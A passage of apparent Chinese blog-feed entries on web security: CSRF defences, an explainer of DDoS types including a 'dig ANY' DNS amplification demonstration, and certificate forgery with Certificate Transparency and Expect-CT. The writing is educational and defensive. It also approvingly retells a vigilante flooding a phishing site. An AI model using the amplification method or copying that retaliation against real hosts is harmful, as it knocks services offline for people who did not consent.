src="https://cdn.nlark.com/yuque/0/2020/png/355497/1603782372134-38ab73be-93f2-43c9-b895-acc20261e50a.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_31,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/355497/1603782372134-38ab73be-93f2-43c9-b895-acc20261e50a.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_31,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></th></tr></thead></table><p><a name="kOKhj"></a></p><h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a><br />防御措施</h1><p>一、防范 CSRF 攻击可以遵循以下几种规则：<br />●Get 请求不对数据进行修改<br />● 不让第三方网站访问到用户 Cookie<br />● 阻止第三方网站请求接口<br />● 请求时附带验证信息，比如验证码或者 Token<br />二、防御措施<br />● 检查 referer 字段<br />● 同步表单校验：表单中带有服务器生成的 token，提交时要带上<br />● 双重 cookie 校验<br><a name="Xb02V"></a></p><h2 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a><br />SameSite</h2><p><br />一、可以对 Cookie 设置 SameSite 属性。<br />见 Cookie, document.cookie#SameSite：<a href="https://www.yuque.com/tqpuuk/yrrefz/ns4z0t">https://www.yuque.com/tqpuuk/yrrefz/ns4z0t</a></p><p><a name="KvPt8"></a></p><h2 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a><br />Referer Check</h2><p><br />一、HTTP Referer 是 header 的一部分，当浏览器向 web 服务器发送请求时，一般会带上 Referer 信息告诉服务器是从哪个页面链接过来的，服务器借此可以获得一些信息用于处理。</p><p>二、可以通过检查请求的来源来防御 CSRF 攻击。</p><p>三、正常请求的 referer 具有一定规律，如在提交表单的 referer 必定是在该页面发起的请求。所以通过检查 http 包头 referer 的值是不是这个页面，来判断是不是 CSRF 攻击。</p><p>四、在某些情况下如从 https 跳转到 http，浏览器处于安全考虑，不会发送 referer，服务器就无法进行 check 了。若与该网站同域的其他网站有 XSS 漏洞，那么攻击者可以在其他网站注入恶意脚本，受害者进入了此类同域的网址，也会遭受攻击。<br />1、出于以上原因，无法完全依赖 Referer Check 作为防御 CSRF 的主要手段。<br />2、但是可以通过 Referer Check 来监控 CSRF 攻击的发生。</p><p>五、优点<br />1、简单易行，仅需要在关键访问处增加一步校验。</p><p>六、局限性<br />1、其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p><p><a name="N2SNL"></a></p><h2 id="Anti-CSRF-Token（用得最多）"><a href="#Anti-CSRF-Token（用得最多）" class="headerlink" title="Anti CSRF Token（用得最多）"></a><br />Anti CSRF Token（用得最多）</h2><p><br />一、目前比较完善的解决方案是加入 Anti-CSRF-Token。<br />1、即发送请求时在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器建立一个拦截器来验证这个 token。<br />2、服务器读取浏览器当前域 cookie 中这个 token 值，会进行校验该请求当中的 token 和 cookie 当中的 token 值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。</p><p>二、这种方法相比 Referer 检查要安全很多，token 可以在用户登陆后产生并放于 session 或 cookie 中，然后在每次请求时服务器把 token 从 session 或 cookie 中拿出，与本次请求中的 token 进行比对。</p><p>三、由于 token 的存在，攻击者无法再构造出一个完整的 URL 实施 CSRF 攻击。但在处理多个页面共存问题时，当某个页面消耗掉 token 后，其他页面的表单保存的还是被消耗掉的那个 token，其他页面的表单提交时会出现 token 错误。</p><p>| 【示例】】在同步渲染页面时，在表单请求中增加一个_csrf 的查询参数，这样当用户在提交这个表单的时候就会将 CSRF token 提交上来&#96;&#96;&#96;javascript</p><form method="POST" action="/upload?_csrf=" enctype="multipart/form-data">     用户名: <input name="name" />   选择头像: <input name="file" type="file" />  <button type="submit">提交</button></form>``` || --- |<p><br />四、token 仅仅是预防 csrf 用的。如果攻击者使用 xss 获取到 token，那么该方案就会失效。这样的攻击可以称为 xsrf<br><a name="qHAL1"></a></p><h2 id="双重-cookie-校验"><a href="#双重-cookie-校验" class="headerlink" title="双重 cookie 校验"></a><br /><br />双重 cookie 校验</h2><p><br />一、一重是浏览器自动附加的 cookie，另一重就是在页面代码中通过其他手段（自定义请求头、请求体、URL 查询参数）传递的 cookie。<br />二、攻击者发起 CSRF 攻击时，请求中只会包含浏览器附加的 cookie 请求头，把这种只有一重 cookie 的请求拦掉就实现了防御。</p><p><a name="WFElw"></a></p><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a><br />验证码</h2><p><br />一、应用程序和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求。在通常情况下，验证码够很好地遏制 CSRF 攻击。<br />二、但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDoS攻击</title>
      <link href="/2023/06/29/frontend/security/ddos-gong-ji/"/>
      <url>/2023/06/29/frontend/security/ddos-gong-ji/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="a5afdfe0"></a></p><h2 id="DDoS-攻击"><a href="#DDoS-攻击" class="headerlink" title="DDoS 攻击"></a>DDoS 攻击</h2><p><a name="2141f601"></a></p><h3 id="什么是-DDoS-攻击"><a href="#什么是-DDoS-攻击" class="headerlink" title="什么是 DDoS 攻击"></a>什么是 DDoS 攻击</h3><p>DDoS 全称 Distributed Denial of Service，中文意思为“分布式拒绝服务”，就是利用大量合法的分布式服务器对目标发送请求，从而导致正常合法用户无法获得服务。比喻一个饭店有 50 个位，当 50 个位都坐满之后，再想有客人进来点餐，必须等到在吃的客人吃完结账离开才行。但是在座的客人一直不离开，新来的客人只得不停地排队或者离开，餐厅相当于过载，这就是“拒绝服务”。</p><p>网络骗子无处不在，其中一种诈骗方式就是钓鱼网站。笔者曾在某 IT 论坛上见过一名网友的经历自述，该网友收到含有钓鱼网站链接的诈骗信息，但他是个搞技术的人，并没中招，反而自行编写了一个能够以高速发送网络请求的 phython 程序，针对该钓鱼网站进行打击，不一会就将其击溃了。连续攻击几天后，骗子不得不修改了域名。</p><p><a name="48bca0c6"></a></p><h3 id="DDoS-攻击的特点"><a href="#DDoS-攻击的特点" class="headerlink" title="DDoS 攻击的特点"></a>DDoS 攻击的特点</h3><p>不同于其它劫持类攻击或篡改数据类攻击，DDoS 攻击简单粗暴，可以达到直接摧毁目标的目的，只要是面向大众的服务就需要对外接口，只要有对外接口就能发起 DDoS 攻击。另外，相对其他攻击手段 DDoS 的技术要求和发动攻击的成本很低，只需要购买部分服务器权限或控制一批肉鸡即可，而且攻击相应速度很快，攻击效果可视。另一方面，DDoS 具有易攻难守的特征，服务提供商为了保证正常客户的需求需要耗费大量的资源才能和攻击发起方进行对抗。这些特点使得 DDoS 成为黑客们手中的一把很好使的利剑，而且所向霹雳。</p><p><a name="396000aa"></a></p><h3 id="DDoS-的攻击方式"><a href="#DDoS-的攻击方式" class="headerlink" title="DDoS 的攻击方式"></a>DDoS 的攻击方式</h3><p>从 DDoS 的危害性和攻击行为来看，我们可以将 DDoS 攻击方式分为以下几类：</p><p><a name="8102d76d"></a></p><h4 id="资源消耗类攻击"><a href="#资源消耗类攻击" class="headerlink" title="资源消耗类攻击"></a>资源消耗类攻击</h4><p>资源消耗类是比较典型的 DDoS 攻击，最具代表性的包括：Syn Flood、Ack Flood、UDP<br />Flood。这类攻击的目标很简单，就是通过大量请求消耗正常的带宽和协议栈处理资源的能力，从而达到服务端无法正常工作的目的。其中 Syn Flood 最为经典，其被发现于 1996 年，但至今仍然保持着强大的生命力。Syn Flood 利用 TCP 协议设计中的致命缺陷，而 TCP&#x2F;IP 协议是整个互联网的基础，这也是 Syn Flood 如此猖獗的原因。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913737822-17f3470a-103a-4d7f-b315-7da33aad95ea.png#height=375&id=R0aYo&originHeight=375&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119253&status=done&style=none&title=&width=766" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913737822-17f3470a-103a-4d7f-b315-7da33aad95ea.png#height=375&id=R0aYo&originHeight=375&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119253&status=done&style=none&title=&width=766" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="1.png"></p><p><a name="96ea2479"></a></p><h4 id="图-1-DDoS-攻击示意图"><a href="#图-1-DDoS-攻击示意图" class="headerlink" title="图 1.DDoS 攻击示意图"></a>图 1.DDoS 攻击示意图</h4><p>在正常情况下，TCP 三次握手过程如下：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913745555-ca23a659-dd9e-47ea-b9e5-c3cb905cb9a4.png#height=207&id=C8PZR&originHeight=207&originWidth=626&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45241&status=done&style=none&title=&width=626" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913745555-ca23a659-dd9e-47ea-b9e5-c3cb905cb9a4.png#height=207&id=C8PZR&originHeight=207&originWidth=626&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45241&status=done&style=none&title=&width=626" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="2.png"></p><p>（1）客户端向服务器端发送一个 SYN 包，包含客户端使用的端口号和初始序列号 x；</p><p>（2）服务器端收到客户端发送来的 SYN 包后，向客户端发送一个 SYN 和 ACK 都置位的 TCP 报文，包含确认号 x+1 和服务器端的初始序列号 y；</p><p>（3）客户端收到服务器端返回的 SYN+ACK 报文后，向服务器端返回一个确认号为 y+1、序号为 x+1 的 ACK 报文，一个标准的 TCP 连接完成。</p><p>而 SYN flood 在攻击时，首先伪造大量的源 IP 地址，分别向服务器端发送大量的 SYN 包，此时服务器端会根据各个 SYN 包中的 IP 地址发送 SYN&#x2F;ACK 包，因为源地址是伪造的，所以伪造的 IP 并不会应答，服务器端没有收到伪造 IP 的回应，会重试 3 ～ 5 次并且等待一个 SYN Time，如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的 SYN 请求，服务器端将会消耗非常多的资源来处理这种半连接，同时还要不断地对这些 IP 进行 SYN+ACK 重试，导致服务器资源枯竭，无暇理睬正常的连接请求，这就是拒绝服务。</p><p><a name="e1da5a06"></a></p><h4 id="服务消耗性攻击"><a href="#服务消耗性攻击" class="headerlink" title="服务消耗性攻击"></a>服务消耗性攻击</h4><p>相比资源消耗类攻击，服务消耗类攻击不需要太大的流量，它主要是针对服务的特点进行精确定点打击，如 web 的 CC，数据服务的检索，文件服务的下载等。这类攻击往往不是为了拥塞流量通道或协议处理通道，它们是让服务端始终处理高消耗型的业务的忙碌状态，进而无法对正常业务进行响应。</p><p>CC 攻击全称 Challenge Collapasar，CC 攻击的原理非常简单，就是对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。在 Web 应用中，查询数据库、读&#x2F;写硬盘文件等操作，相对都会消耗比较多的资源，例如一般的站点中都有搜索服务，CC 攻击可以不断地发起搜索请求来使用搜索服务，大量的搜索服务使得服务器不得不挪用资源去处理，当请求量达到一定程度时就可能导致服务过载。</p><p><a name="b7eae217"></a></p><h4 id="反射类攻击"><a href="#反射类攻击" class="headerlink" title="反射类攻击"></a>反射类攻击</h4><p>反射攻击也叫放大攻击，该类攻击以 UDP 协议为主，一般请求回应的流量远远大于请求本身流量的大小。反射攻击有很多种，包括 Smurf 攻击、NTP 反射攻击、SSDP 反射攻击和 DNS 反射攻击等。下面来看看 DNS 攻击：</p><p>DNS 服务是整个互联网的基础服务，在我们链接互联网的时候，需要通过 DNS 解析将域名转化成对应的 IP 地址。理论上来说 ISP 的 DNS 服务器只响应来自它自己客户 IP 的 DNS Query 响应，但事实上互联网上大量 DNS 服务的默认配置缺失，导致了会响应所有 IP 的 DNS Query 请求。同时，DNS 大部分使用 UDP 协议，UDP 协议没有握手过程让其去验证请求的源 IP。综合以上两点，攻击者控制傀儡机发送大量伪造了 IP 的请求给 DNS 服务器，因为 UDP 协议的原因 DNS 服务器不会去验证 IP 的真伪，直接照单全收，将请求加工包裹后反射给受害者（攻击目标服务器），而这个加工包裹正是流量放大的关键。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913752951-ac7848ae-643b-4fa5-ad25-0a59985d1716.png#height=504&id=kOpsq&originHeight=504&originWidth=926&originalType=binary&ratio=1&rotation=0&showTitle=false&size=223177&status=done&style=none&title=&width=926" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913752951-ac7848ae-643b-4fa5-ad25-0a59985d1716.png#height=504&id=kOpsq&originHeight=504&originWidth=926&originalType=binary&ratio=1&rotation=0&showTitle=false&size=223177&status=done&style=none&title=&width=926" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="3.png"></p><p><a name="5fe3a126"></a></p><h4 id="图-2-DNS-反射攻击"><a href="#图-2-DNS-反射攻击" class="headerlink" title="图 2.DNS 反射攻击"></a>图 2.DNS 反射攻击</h4><p>下面再来看一下 DNS 如何将请求数据包进行放大，输入(x.x.x.x 为 DNS 服务器 IP)：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig ANY  @x.x.x.x</span><br></pre></td></tr></table></figure><p>返回结果，这里为了节约篇幅，我们省略了大部分的响应内容。我们可以看到，响应的内容远远大于请求的数据包内容，这里就产生了放大的效果。</p><p>; &lt;&lt;&gt;&gt; DiG 9.7.3 &lt;&lt;&gt;&gt; ANY <a href="/x.x.x.x">@x.x.x.x </a> <br />;; global options: +cmd<br />;; Got answer:</p><p>………………………………….此处省略具体请求内容…………………………………………</p><p>isc.org. 484 IN RRSIG A 5 2 7200 20121125230752 20121026230752 4442 isc.org.   ViS+qg95DibkkZ5kbL8vCBpRUqI2&#x2F;M9UwthPVCXl8ciglLftiMC9WUzq Ul3FBbri5CKD&#x2F;YNXqyvjxyvmZfkQLDUmffjDB+ZGqBxSpG8j1fDwK6n1 hWbKf7QSe4LuJZyEgXFEkP16CmVyZCTITUh2TNDmRgsoxrvrOqOePWhp 8+E&#x3D;</p><p><a name="ff14d2ca"></a></p><h3 id="DDoS-防御手段"><a href="#DDoS-防御手段" class="headerlink" title="DDoS 防御手段"></a>DDoS 防御手段</h3><p><a name="fcd2801b"></a></p><h4 id="限制请求频率"><a href="#限制请求频率" class="headerlink" title="限制请求频率"></a>限制请求频率</h4><p>最常见的针对应用层 DDOS 攻击的防御措施，是在应用中针对每个“客户端”做一个请求频率的限制。它的思路很简单，通过 IP 地址与 Cookie 定位一个客户端，如果客户端的请求在一定时间内过于频繁，则对之后来自该客户端的所有请求都重定向到一个出错页面。从架构上看，这段代码需要放在业务逻辑之前，才能起到保护后端应用的目的，可以看做是一个“基层”的安全模块。</p><p>然而这种防御方法并不完美，因为它在客户端的判断依据上并不是永远可靠的。这个方案中有两个因素用以定位一个客户端：一个是 IP 地址，另一个是 Cookie。但用户的 IP 地址可能会发生改变，而 Cookie 又可能会被清空，如果 IP 地址和 Cookie 同时都发生了变化，那么就无法再定位到同一个客户端了。比如使用代理、傀儡机来让 IP 地址发生变化。</p><p><a name="d11b99d3"></a></p><h4 id="应对代理与傀儡机"><a href="#应对代理与傀儡机" class="headerlink" title="应对代理与傀儡机"></a>应对代理与傀儡机</h4><p>Yahoo 为我们提供了一个解决思路。因为发起应用层 DDOS 攻击的 IP 地址都是真实的，所以在实际情况中，攻击者的 IP 地址其实也不可能无限制增长。假设攻击者有 1000 个 IP 地址发起攻击，如果请求了 10000 次，则平均每个 IP 地址请求同一页面达到 10 次，攻击如果持续下去，单个 IP 地址的请求也将变多，但无论如何变，都是在这 1000 个 IP 地址的范围内做轮询。为此 Yahoo 实现了一套算法，根据 IP 地址和 Cookie 等信息，可以计算客户端的请求频率并进行拦截。Yahoo 设计的这套系统也是为 Web Server 开发的一个模块，但在整体架构上会有一台 master 服务器集中计算所有 IP 地址的请求频率，并同步策略到每台 WebServer 上。因此，我们也可以借助这样的一个思想实现代理、傀儡机 DDoS 防御机制。</p><p><a name="983f59c9"></a></p><h4 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h4><p>验证码是互联网中常用的技术之一，它的英文简称是 CAPTCHA（Completely AutomatedPublic Turing Test to Tell Computers and Humans Apart，全自动区分计算机和人类的图灵测试）。在很多时候，如果可以忽略对用户体验的影响，那么引入验证码这一手段能够有效地阻止自动化的重放行为。但如果用户体验比较重要，就不得不考虑放弃验证码。验证的的核心思想是识别人与机器，因此我们可以通过一段 JavaScript 来区分当前客户端是人为控制的浏览器，还是机器脚本，原理很简单，大部分的脚本都是直接构造 HTPP 包来完成请求的，例如 Phython，而不是通过浏览器发送的请求，所有从服务器发送一段 JS 脚本至客户端并给出正确结果，如果客户端是浏览器则这段 JS 脚本能正常运行并且运行结果与来自服务器的一致，但客户端是非浏览器环境的则无法执行 JS，由此可以判断客户端到底是不是浏览器。不过，有些自动话脚本是 JS 编写，内挂至浏览器运行的，那就没办法了。</p><p><a name="229071f5"></a></p><h4 id="利用-Web-Server-的防御手段"><a href="#利用-Web-Server-的防御手段" class="headerlink" title="利用 Web Server 的防御手段"></a>利用 Web Server 的防御手段</h4><p>在某些 Web Server 容器中，可以通过调整一些选项的值来达到一定程度的防御效果，比如 Apache，在 Apache 的配置文件中，有一些参数可以缓解 DDOS 攻击。比如调小 Timeout、KeepAliveTimeout 值，增加 MaxClients 值。</p><p>Apache 提供的模块接口为我们扩展 Apache、设计防御措施提供了可能。目前已经有一些开源的 Module 全部或部分实现了针对应用层 DDOS 攻击的保护。“mod_qos”就是 Apache 的一个 Module，它可以帮助缓解应用层 DDOS 攻击。比如 mod_qos 的下面这些配置就非常有价值。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913763621-b007ee55-18d4-4f0d-b807-5e5ef5c238f2.png#height=447&id=JuPon&originHeight=447&originWidth=809&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45867&status=done&style=none&title=&width=809" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913763621-b007ee55-18d4-4f0d-b807-5e5ef5c238f2.png#height=447&id=JuPon&originHeight=447&originWidth=809&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45867&status=done&style=none&title=&width=809" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="4.png"></p><p><a name="5db9fd7c"></a></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>DDoS 不论在过去还是现在都是一个深受关注的课题，互联网的特性决定了它不会轻易地消失。DDoS 本质是对有限资源的无限制滥用所造成的。所以，解决这个问题的核心思路就是限制每个不可信任的资源使用者的配额。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPS 证书伪造</title>
      <link href="/2023/06/29/frontend/security/https-zheng-shu-wei-zao/"/>
      <url>/2023/06/29/frontend/security/https-zheng-shu-wei-zao/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><code>HTTPS</code>  协议的安全依赖于它的证书机制，如果攻击者申请到了一张和你的网站一摸一样的证书，那你网站的安全机制也就不复存在了。本文来聊一聊，如何预防  <code>HTTPS</code>  证书伪造。</p><p><a name="xg7ZZ"></a></p><h2 id="证书劫持"><a href="#证书劫持" class="headerlink" title="证书劫持"></a>证书劫持</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1597217569997-f70b5aeb-e8ea-43ea-85f2-0b25b006c45f.png#height=339&id=u4ImZ&originHeight=339&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=200924&status=done&style=none&title=&width=800" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1597217569997-f70b5aeb-e8ea-43ea-85f2-0b25b006c45f.png#height=339&id=u4ImZ&originHeight=339&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=200924&status=done&style=none&title=&width=800" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>如果想部署 <code>HTTPS</code> 网站，首先向 <code>CA</code> 机构申请一张证书， <code>CA</code> 机构在审核申请者的身份后，会签发一张证书，证书中包含了申请者网站的主机名、主机公钥，同时 <code>CA</code> 机构会用自己的私钥对整个证书进行签名，并将签名添加到证书文件中，然后发送给证书申请者。证书是 TLS 协议中非常关键的一环，其主要作用：</p><ul><li>向网站访问者确认服务器的真实身份，确保客户端（浏览器）是和真正的网站提供者在通信，避免遇到中间人攻击，实现密码学中的身份认证特性。</li><li>客户端和服务器使用证书中的公钥（依赖于不同的密码协商算法，功能有所不同）协商出主密钥（<code>Master Secret</code>），有了主密钥，客户端和服务器端就可以保证通信数据是加密且没有被篡改。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1597217591047-3eb3313e-833e-432d-9967-fa62c967bd9a.png#height=511&id=GDS9B&originHeight=511&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100270&status=done&style=none&title=&width=1080" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1597217591047-3eb3313e-833e-432d-9967-fa62c967bd9a.png#height=511&id=GDS9B&originHeight=511&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100270&status=done&style=none&title=&width=1080" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><code>HTTPS</code> 证书最大的问题就是伪造证书的存在，一旦出现伪造证书，安全体系将会非常脆弱，出现伪造证书的原因如下：</p><ul><li><code>CA</code> 机构有意无意会签发一些错误的证书，比如 <code>CA</code> 机构没有正确校验申请者的身份。</li><li><code>CA</code> 机构是一个追求盈利的机构，在利益的驱动下，可能会无节制的签发证书，如果签发一个恶意的二级 <code>CA</code> 证书，带来的危害更大。</li><li>攻击者会通过各种技术攻击手段，冒充或者伪造某个域名的拥有者，从而成功申请到一张证书，然后通过证书进行危害操作。</li></ul><p>这时，证书的使用者可能会存在下面的困惑：</p><ul><li>域名拥有者无法知晓那些 <code>CA</code> 机构给他签发了证书，也不知道是否有人冒充他的身份申请证书并提供服务。</li><li><code>CA</code> 机构并不清楚它到底签发了多少证书，也不确定是否签发了伪造证书，二级 <code>CA</code> 签发机制不可控。</li><li>对于浏览器来说，它没有技术手段校验证书是否是合法的。</li></ul><p><a name="eixvS"></a></p><h2 id="证书透明度"><a href="#证书透明度" class="headerlink" title="证书透明度"></a>证书透明度</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1597217648034-f3d16d20-05e7-4955-9131-1170e25d3917.png#height=770&id=bZaHv&originHeight=770&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=121310&status=done&style=none&title=&width=1080" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1597217648034-f3d16d20-05e7-4955-9131-1170e25d3917.png#height=770&id=bZaHv&originHeight=770&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=121310&status=done&style=none&title=&width=1080" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>为了解决证书潜在的问题，谷歌提出了一个解决方案，这就是证书透明度（CT）。CT 是一组技术解决方案，它能够审计、监控证书的签发、使用，从而让更透明，它不是证书的替代解决方案，而是证书的有效补充。通过 CT，能够达成以下的几个目标：</p><ul><li><code>CA</code> 机构能够知晓其签发了那些证书，并快速检测到是否签发恶意证书了。</li><li>网站拥有者能够知晓域名对应证书签发的全过程，一旦发现有攻击者伪造了域名对应的证书，可以快速联系 <code>CA</code> 机构，吊销该证书。</li><li>浏览器厂商能够审计证书的使用情况，如果发现有恶意证书，可以快速关闭 HTTPS 连接，保障用户的安全。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1597217664356-53095465-1bc9-4f6d-899c-559c3008dd5b.png#height=328&id=y4I3b&originHeight=328&originWidth=684&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31723&status=done&style=none&title=&width=684" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1597217664356-53095465-1bc9-4f6d-899c-559c3008dd5b.png#height=328&id=y4I3b&originHeight=328&originWidth=684&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31723&status=done&style=none&title=&width=684" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="Expect-CT"></a></p><h2 id="Expect-CT"><a href="#Expect-CT" class="headerlink" title="Expect-CT"></a>Expect-CT</h2><p>为了确保浏览器能在访问到缺少  <code>CT</code>  监督的证书（例如 CA 意外发出的证书）时采取措施，<code>Google</code>  提案增加了一个新的  <code>Expect-CT HTTP Header</code>，该  <code>HTTP Header</code>  用来告诉浏览器期望证使用书透明度服务。<code>Expect-CT</code>  <code>CT</code>  头部允许站点选择报告或强制执行证书透明度要求，这可以防止站点证书错误被忽视的情况。当站点启用  <code>Expect-CT CT Header</code>  时，浏览器会检查该站点使用的证书是否出现在公共 CT 日志中，这能有效的避免中间人攻击等  <code>HTTPS</code>  威胁，让站点更加安全。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1597217687228-d300ce5b-8e56-41b6-bea6-a13ad20fdf64.png#height=718&id=FAyIk&originHeight=718&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197013&status=done&style=none&title=&width=1080" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1597217687228-d300ce5b-8e56-41b6-bea6-a13ad20fdf64.png#height=718&id=FAyIk&originHeight=718&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197013&status=done&style=none&title=&width=1080" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expect-CT: report-uri=&quot;&lt;uri&gt;&quot;, enforce,max-age=&lt;age&gt;</span><br></pre></td></tr></table></figure><p>在部署的时候有两种策略可供选择，一种是仅报告，一种是强制执行。在仅报告策略中，浏览器在没有收到有效的 CT 信息情况下，会向<code>report-uri</code>设置的地址发送报告。对于该策略，你可以如下设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expect-CT: max-age=0, report-uri=&quot;https://&#123;$subdomain&#125;.report-uri.com/r/d/ct/reportOnly&quot;</span><br></pre></td></tr></table></figure><p>该策略下，如果浏览器未收到有效的 CT 信息，不会终止连接，只会向你指定的 URI 发送报告。而第二种策略可如下设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expect-CT: enforce, max-age=30, report-uri=&quot;https://&#123;$subdomain&#125;.report-uri.com/r/d/ct/enforce&quot;</span><br></pre></td></tr></table></figure><p>这也就是告诉浏览器强制执行  <code>CT</code>  策略并且缓存该状态  <code>30s</code> 。如果浏览器没有收到有效的  <code>CT</code>  信息，将会终止链接同时也会发送报告。在正确的配置好  <code>CT</code>  信息后，你可以将该时间设置的更长。</p><blockquote><p>以下文章来源于 code 秘密花园  ，作者 ConardLi</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OS命令注入</title>
      <link href="/2023/06/29/frontend/security/os-ming-ling-zhu-ru/"/>
      <url>/2023/06/29/frontend/security/os-ming-ling-zhu-ru/</url>
      
